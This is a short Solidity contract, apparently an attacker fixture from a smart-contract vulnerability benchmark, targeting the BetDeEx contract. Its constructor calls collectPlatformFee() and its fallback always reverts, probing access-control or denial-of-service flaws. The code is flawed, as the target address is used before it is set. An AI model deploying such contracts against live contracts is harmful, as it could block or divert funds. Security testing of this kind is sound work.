import "BetDeEx.sol";
contract Attacker_BetDeEx{
    address payable private _owner;
    address payable private _vulnerableAddr;
    BetDeEx public fd = BetDeEx(_vulnerableAddr);
    constructor() public {
         _owner = msg.sender;
         fd. collectPlatformFee();
    }
    function() external{
        revert();
    }}